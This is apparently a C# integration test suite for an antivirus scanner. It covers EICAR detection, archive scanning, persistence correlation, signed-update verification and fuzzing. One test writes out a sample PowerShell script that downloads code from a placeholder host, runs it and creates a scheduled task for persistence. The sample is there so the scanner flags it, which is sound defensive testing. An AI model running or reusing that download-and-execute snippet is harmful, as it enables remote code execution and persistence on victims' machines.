using SCU.Interop;
using SCU.Models.Scan;
using Xunit;

namespace SCU.Tests;

// Интеграционный smoke реального ScannerCore.exe (документ п. 40: обязательный
// EICAR smoke, включая обычный файл). Отсутствие бинарника — FAIL (п. 10
// аудита: тихий PASS недопустим); локальный осознанный skip — только через
// SCU_ALLOW_INTEGRATION_SKIP=1 с явной пометкой SKIPPED в выводе теста.
// Suite=Integration — реальный подпроцесс ScannerCore; Suite=Security —
// обязательные security-регрессии п. 11 аудита (фильтры CI-матрицы).
[Trait("Suite", "Integration")]
[Trait("Suite", "Security")]
public partial class ScannerCoreIntegrationTests
{
    private static string? FindScannerCore()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        for (var i = 0; i < 6 && directory is not null; i++)
        {
            var candidate = Path.Combine(directory.FullName, "SecurityScanner", "out", "Release", "ScannerCore.exe");
            if (File.Exists(candidate))
            {
                return candidate;
            }

            var binCandidate = Path.Combine(directory.FullName, "ScannerCore.exe");
            if (File.Exists(binCandidate))
            {
                return binCandidate;
            }

            directory = directory.Parent;
        }

        return null;
    }

    // П. 10 аудита: интеграционный тест без ScannerCore — это FAIL, а не тихий
    // PASS. В CI бинарник обязан быть собран; локально разрешён осознанный skip
    // через SCU_ALLOW_INTEGRATION_SKIP=1 — с явной пометкой SKIPPED в выводе.
    private static void ReportSkip()
    {
        const string message =
            "SKIPPED: ScannerCore.exe не собран. Соберите: cmake -S SecurityScanner -B SecurityScanner/build -A x64 && cmake --build SecurityScanner/build --config Release";
        if (Environment.GetEnvironmentVariable("SCU_ALLOW_INTEGRATION_SKIP") == "1")
        {
            Console.WriteLine(message);
            return;
        }

        Assert.Fail(message);
    }

    // Стандартная EICAR-тестовая строка (публичный справочный образец для
    // проверки антивирусных движков; безвредна, не исполняется тестом).
    private const string Eicar =
        @"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    private static async Task<ScanResultDto?> ScanDirectoryAsync(string scannerPath, string target)
    {
        var (exitCode, events) = await RunScannerAsync(scannerPath, startInfo =>
        {
            startInfo.ArgumentList.Add("scan");
            startInfo.ArgumentList.Add("--mode");
            startInfo.ArgumentList.Add("custom");
            startInfo.ArgumentList.Add("--path");
            startInfo.ArgumentList.Add(target);
            startInfo.ArgumentList.Add("--dev-unsigned-ok");
        }).ConfigureAwait(false);

        return events.Find(e => e.Kind == ScanEventKind.Finished)?.Result;
    }

    private static async Task<(int ExitCode, List<ScanEvent> Events)> RunScannerAsync(
        string scannerPath, Action<System.Diagnostics.ProcessStartInfo> configure)
    {
        var startInfo = new System.Diagnostics.ProcessStartInfo
        {
            FileName = scannerPath,
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            WorkingDirectory = Path.GetDirectoryName(scannerPath)!,
        };
        configure(startInfo);

        var events = new List<ScanEvent>();
        using var process = new System.Diagnostics.Process { StartInfo = startInfo };
        process.Start();
        var stdout = ConsoleOutputDecoder.ReadLinesAsync(
            process.StandardOutput.BaseStream,
            line => events.Add(ScanEventParser.Parse(line)),
            CancellationToken.None);
        process.WaitForExit(120000);
        await stdout;
        return (process.ExitCode, events);
    }

    private static string? FindDatabaseSigningKey()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        for (var i = 0; i < 6 && directory is not null; i++)
        {
            var candidate = Path.Combine(directory.FullName,
                "SecurityScanner", "tools", "database-builder", "db-signing-private.pem");
            if (File.Exists(candidate))
            {
                return candidate;
            }

            directory = directory.Parent;
        }

        return null;
    }

    // Подписанный пакет базы (как DatabaseBuilder): hashes.txt + sig + db-version.json.
    private static byte[] BuildSignedPackage(byte[] hashesBytes, byte[] versionJson, string keyPath)
    {
        using var ecdsa = System.Security.Cryptography.ECDsa.Create();
        ecdsa.ImportFromPem(File.ReadAllText(keyPath));
        var signature = ecdsa.SignData(hashesBytes, System.Security.Cryptography.HashAlgorithmName.SHA256);

        using var stream = new MemoryStream();
        using (var zip = new System.IO.Compression.ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create, leaveOpen: true))
        {
            AddZipEntry(zip, "hashes.txt", hashesBytes);
            AddZipEntry(zip, "hashes.txt.sig", signature);
            AddZipEntry(zip, "db-version.json", versionJson);
        }

        return stream.ToArray();
    }

    private static void AddZipEntry(System.IO.Compression.ZipArchive zip, string name, byte[] content)
    {
        var entry = zip.CreateEntry(name);
        using var entryStream = entry.Open();
        entryStream.Write(content);
    }

    [Fact]
    public async Task ScannerCore_DetectsEicarFile()
    {
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            await File.WriteAllTextAsync(Path.Combine(temp, "eicar.com"), Eicar);
            await File.WriteAllTextAsync(Path.Combine(temp, "clean.txt"), "hello");

            var result = await ScanDirectoryAsync(scannerPath, temp);

            Assert.NotNull(result);
            Assert.Equal(2, result!.Summary.FilesScanned);
            Assert.Equal(1, result.Summary.Detections);
            var detection = Assert.Single(result.Detections);
            Assert.Equal("malware", detection.Verdict);
            Assert.Equal("eicar.com", Path.GetFileName(detection.Path));
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_DetectsEicarInsideNestedZip_WithContainerPath()
    {
        // Документ п. 20: архивы сканируются с извлечением членов, virtual path,
        // containerPath — реальный контейнер для карантина целиком.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var innerPath = Path.Combine(temp, "inner.zip");
            using (var inner = new System.IO.Compression.ZipArchive(
                       File.Create(innerPath), System.IO.Compression.ZipArchiveMode.Create))
            {
                var entry = inner.CreateEntry("eicar.com");
                using var writer = new StreamWriter(entry.Open());
                await writer.WriteAsync(Eicar);
            }

            var outerPath = Path.Combine(temp, "outer.zip");
            using (var outer = new System.IO.Compression.ZipArchive(
                       File.Create(outerPath), System.IO.Compression.ZipArchiveMode.Create))
            {
                var directEntry = outer.CreateEntry("eicar.com");
                using (var writer = new StreamWriter(directEntry.Open()))
                {
                    await writer.WriteAsync(Eicar);
                }

                using var innerStream = File.OpenRead(innerPath);
                var innerEntry = outer.CreateEntry("inner.zip");
                using (var entryStream = innerEntry.Open())
                {
                    await innerStream.CopyToAsync(entryStream);
                }
            }

            var result = await ScanDirectoryAsync(scannerPath, outerPath);

            Assert.NotNull(result);
            // Член outer.zip напрямую + член вложенного inner.zip.
            Assert.Equal(2, result!.Summary.Detections);
            Assert.All(result.Detections, detection =>
            {
                Assert.Equal("malware", detection.Verdict);
                Assert.True(detection.IsVirtual);
                Assert.Equal(outerPath, detection.ContainerPath);
            });
            Assert.Contains(result.Detections, detection =>
                detection.Path.Contains("inner.zip", StringComparison.OrdinalIgnoreCase));
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_DetectsSuspiciousScript()
    {
        // Документ п. 19: скрипт с download cradle + persistence — suspicious;
        // порог требует нескольких независимых сигналов.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var scriptPath = Path.Combine(temp, "evil.ps1");
            await File.WriteAllTextAsync(scriptPath, """
                $w = New-Object Net.WebClient
                $p = $w.DownloadString('http://example.invalid/p')
                Invoke-Expression $p
                schtasks /create /tn Updater /tr $p /sc daily
                """);

            var result = await ScanDirectoryAsync(scannerPath, temp);

            Assert.NotNull(result);
            var detection = Assert.Single(result.Detections);
            Assert.Equal("suspicious", detection.Verdict);
            Assert.Equal("SCRIPT-HEURISTIC", detection.RuleId);
            Assert.False(detection.IsVirtual);
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_CleanScript_NoDetection()
    {
        // Одиночный слабый сигнал (reg add в Run без persistence-контекста здесь
        // не встречается) — добросовестный пустой скрипт не детектируется.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var scriptPath = Path.Combine(temp, "hello.ps1");
            await File.WriteAllTextAsync(scriptPath, "Write-Output 'hello'\r\n");
            var cleanPath = Path.Combine(temp, "clean.txt");
            await File.WriteAllTextAsync(cleanPath, "clean");

            var result = await ScanDirectoryAsync(scannerPath, temp);

            Assert.NotNull(result);
            Assert.Equal(0, result!.Summary.Detections);
            Assert.Equal(2, result.Summary.FilesScanned);
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_PersistenceCorrelation_DetectsEicarTarget()
    {
        // Документ п. 17/18: persistence-запись коррелируется с анализом цели.
        // Test-hook SCU_TEST_RUN_KEY задаёт дополнительный Run-подобный ключ
        // в HKCU — тест создаёт его и удаляет, production-ключи не трогаются.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var testKey = "Software\\SCU\\TestRun-" + Guid.NewGuid().ToString("N");
        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var eicarPath = Path.Combine(temp, "eicar.com");
            await File.WriteAllTextAsync(eicarPath, Eicar);

            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(testKey.Replace("Software\\", "Software\\")))
            {
                key.SetValue("SCU-Test-Mal", eicarPath, Microsoft.Win32.RegistryValueKind.String);
            }

            Environment.SetEnvironmentVariable("SCU_TEST_RUN_KEY", testKey);
            try
            {
                var result = await ScanDirectoryAsync(scannerPath, temp);

                Assert.NotNull(result);
                Assert.Contains(result!.Detections, detection =>
                    detection.Source == "persistence"
                    && detection.Verdict == "malware"
                    && detection.RuleId == "PERSISTENCE");
            }
            finally
            {
                Environment.SetEnvironmentVariable("SCU_TEST_RUN_KEY", null);
            }
        }
        finally
        {
            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(testKey, throwOnMissingSubKey: false);
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_OwnScriptsClean_NoFalsePositives()
    {
        // Регрессионное требование (документ п. 40.испр): собственные скрипты SCU
        // не детектируются как подозрительные — ComponentAllowlist.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var assets = FindAssetsDirectory();
        if (assets is null)
        {
            Assert.Fail("SCU.App/Assets не найден — тест является обязательным регрессионным.");
        }

        var result = await ScanDirectoryAsync(scannerPath, assets);

        Assert.NotNull(result);
        Assert.Equal(0, result!.Summary.Detections);
        Assert.Equal(0, result.Summary.Errors);
    }

    [Fact]
    public async Task ScannerCore_InstallsSignedPackage_AndDetectsNewIoc()
    {
        // Документ п. 30/33: пакет с валидной ECDSA-подписью применяется
        // атомарно; IOC из новой базы детектируется следующим сканом.
        var scannerPath = FindScannerCore();
        var keyPath = FindDatabaseSigningKey();
        if (scannerPath is null || keyPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-db-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var iocPath = Path.Combine(temp, "dummy.bin");
            var iocContent = "scu-database-package-test-payload-" + Guid.NewGuid().ToString("N");
            await File.WriteAllTextAsync(iocPath, iocContent);
            var iocHash = Convert.ToHexString(
                System.Security.Cryptography.SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(iocContent))
            ).ToLowerInvariant();

            var hashesBytes = System.Text.Encoding.UTF8.GetBytes(
                $"{iocHash}\tmalware\tTest-Package-Ioc\n");
            var versionJson = System.Text.Encoding.UTF8.GetBytes(
                "{\n  \"version\": \"2099.01.01\",\n  \"date\": \"2099-01-01\",\n  \"entries\": 1\n}\n");
            var packagePath = Path.Combine(temp, "package.zip");
            await File.WriteAllBytesAsync(packagePath, BuildSignedPackage(hashesBytes, versionJson, keyPath));

            var (exitCode, events) = await RunScannerAsync(scannerPath, startInfo =>
            {
                startInfo.ArgumentList.Add("update");
                startInfo.ArgumentList.Add("--package");
                startInfo.ArgumentList.Add(packagePath);
                startInfo.ArgumentList.Add("--dev-unsigned-ok");
            });

            Assert.Equal(0, exitCode);
            var updateEvent = Assert.Single(events, e => e.Kind == ScanEventKind.Update);
            Assert.Equal("ok", updateEvent.UpdateStatus);
            Assert.Equal("2099.01.01", updateEvent.DbVersion);

            var scan = await ScanDirectoryAsync(scannerPath, temp);
            Assert.NotNull(scan);
            Assert.Contains(scan!.Detections, detection =>
                detection.Verdict == "malware" && detection.Path.EndsWith("dummy.bin", StringComparison.OrdinalIgnoreCase));
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_RejectsTamperedPackage()
    {
        // Документ п. 33: подпись обязательна. Изменённый hashes.txt без
        // перевыпуска подписи отклоняется, база не меняется.
        var scannerPath = FindScannerCore();
        var keyPath = FindDatabaseSigningKey();
        if (scannerPath is null || keyPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-db-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var hashesBytes = System.Text.Encoding.UTF8.GetBytes(
                "0000000000000000000000000000000000000000000000000000000000000000\tmalware\tTest\n");
            var versionJson = System.Text.Encoding.UTF8.GetBytes(
                "{\n  \"version\": \"2099.01.02\",\n  \"date\": \"2099-01-02\",\n  \"entries\": 1\n}\n");

            var signed = BuildSignedPackage(hashesBytes, versionJson, keyPath);
            // Tamper: правим текст внутри запакованного hashes.txt — подпись больше не сходится.
            var tampered = System.Text.Encoding.UTF8.GetBytes(
                "1111111111111111111111111111111111111111111111111111111111111111\tmalware\tTest\n");
            var packagePath = Path.Combine(temp, "tampered.zip");
            using (var stream = File.Create(packagePath))
            using (var zip = new System.IO.Compression.ZipArchive(stream, System.IO.Compression.ZipArchiveMode.Create))
            {
                AddZipEntry(zip, "hashes.txt", tampered);
                using var signedZip = new System.IO.Compression.ZipArchive(new MemoryStream(signed));
                var sigEntry = signedZip.GetEntry("hashes.txt.sig");
                Assert.NotNull(sigEntry);
                using var sigStream = sigEntry!.Open();
                using var buffer = new MemoryStream();
                sigStream.CopyTo(buffer);
                AddZipEntry(zip, "hashes.txt.sig", buffer.ToArray());
                var versionEntry = signedZip.GetEntry("db-version.json");
                using var versionStream = versionEntry!.Open();
                using var versionBuffer = new MemoryStream();
                versionStream.CopyTo(versionBuffer);
                AddZipEntry(zip, "db-version.json", versionBuffer.ToArray());
            }

            var (exitCode, events) = await RunScannerAsync(scannerPath, startInfo =>
            {
                startInfo.ArgumentList.Add("update");
                startInfo.ArgumentList.Add("--package");
                startInfo.ArgumentList.Add(packagePath);
                startInfo.ArgumentList.Add("--dev-unsigned-ok");
            });

            Assert.NotEqual(0, exitCode);
            var updateEvent = Assert.Single(events, e => e.Kind == ScanEventKind.Update);
            Assert.Equal("failed", updateEvent.UpdateStatus);
            Assert.Contains("signature", updateEvent.Message, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_FuzzSmoke_SurvivesMutants()
    {
        // Документ п. 22/40: парсеры не должны падать на повреждённых входах.
        // Мутанты EICAR-файла, псевдо-PE и случайного мусора сканируются одним
        // процессом; проверяем чистое завершение и итоговое событие finished.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-fuzz-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            var random = new Random(20260925); // детерминированный набор
            var eicarBytes = System.Text.Encoding.ASCII.GetBytes(Eicar);

            for (var i = 0; i < 40; i++)
            {
                var bytes = (byte[])eicarBytes.Clone();
                for (var flip = 0; flip < 8; flip++)
                {
                    bytes[random.Next(bytes.Length)] = (byte)random.Next(256);
                }
                await File.WriteAllBytesAsync(Path.Combine(temp, $"mut-eicar-{i}.bin"), bytes);
            }

            for (var i = 0; i < 20; i++)
            {
                var bytes = new byte[random.Next(64, 4096)];
                random.NextBytes(bytes);
                bytes[0] = (byte)'M';
                bytes[1] = (byte)'Z'; // псевдо-PE: заголовок валиден, остальное — мусор
                await File.WriteAllBytesAsync(Path.Combine(temp, $"mut-pe-{i}.bin"), bytes);
            }

            for (var i = 0; i < 20; i++)
            {
                var bytes = new byte[random.Next(0, 2048)];
                random.NextBytes(bytes);
                bytes[0] = (byte)'P';
                bytes[1] = (byte)'K';
                bytes[2] = 3;
                bytes[3] = 4; // псевдо-ZIP
                await File.WriteAllBytesAsync(Path.Combine(temp, $"mut-zip-{i}.bin"), bytes);
            }

            var (exitCode, events) = await RunScannerAsync(scannerPath, startInfo =>
            {
                startInfo.ArgumentList.Add("scan");
                startInfo.ArgumentList.Add("--mode");
                startInfo.ArgumentList.Add("custom");
                startInfo.ArgumentList.Add("--path");
                startInfo.ArgumentList.Add(temp);
                startInfo.ArgumentList.Add("--dev-unsigned-ok");
            });

            Assert.True(exitCode is 0 or 1, $"scanner crashed or failed: rc={exitCode}");
            Assert.Contains(events, e => e.Kind == ScanEventKind.Finished);
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    [Fact]
    public async Task ScannerCore_ParallelScan_CorrectCounts()
    {
        // Документ п. 26: фиксированный thread pool не меняет результат —
        // счётчики и detections эквивалентны однопоточному скану.
        var scannerPath = FindScannerCore();
        if (scannerPath is null)
        {
            ReportSkip();
            return;
        }

        var temp = Path.Combine(Path.GetTempPath(), "scu-scan-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(temp);
        try
        {
            for (var i = 0; i < 60; i++)
            {
                await File.WriteAllTextAsync(Path.Combine(temp, $"clean-{i}.txt"), $"clean content {i}");
            }

            await File.WriteAllTextAsync(Path.Combine(temp, "e1.com"), Eicar);
            await File.WriteAllTextAsync(Path.Combine(temp, "e2.com"), Eicar);

            var (exitCode, events) = await RunScannerAsync(scannerPath, startInfo =>
            {
                startInfo.ArgumentList.Add("scan");
                startInfo.ArgumentList.Add("--mode");
                startInfo.ArgumentList.Add("custom");
                startInfo.ArgumentList.Add("--path");
                startInfo.ArgumentList.Add(temp);
                startInfo.ArgumentList.Add("--threads");
                startInfo.ArgumentList.Add("4");
                startInfo.ArgumentList.Add("--dev-unsigned-ok");
            });

            Assert.True(exitCode is 0 or 1);
            var result = events.Find(e => e.Kind == ScanEventKind.Finished)?.Result;
            Assert.NotNull(result);
            Assert.Equal(62, result!.Summary.FilesScanned);
            Assert.Equal(2, result.Summary.Detections);
        }
        finally
        {
            Directory.Delete(temp, recursive: true);
        }
    }

    private static string? FindAssetsDirectory()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        for (var i = 0; i < 6 && directory is not null; i++)
        {
            var candidate = Path.Combine(directory.FullName, "SCU.App", "Assets");
            if (Directory.Exists(candidate) && File.Exists(Path.Combine(candidate, "SCU.ps1")))
            {
                return candidate;
            }

            directory = directory.Parent;
        }

        return null;
    }
}
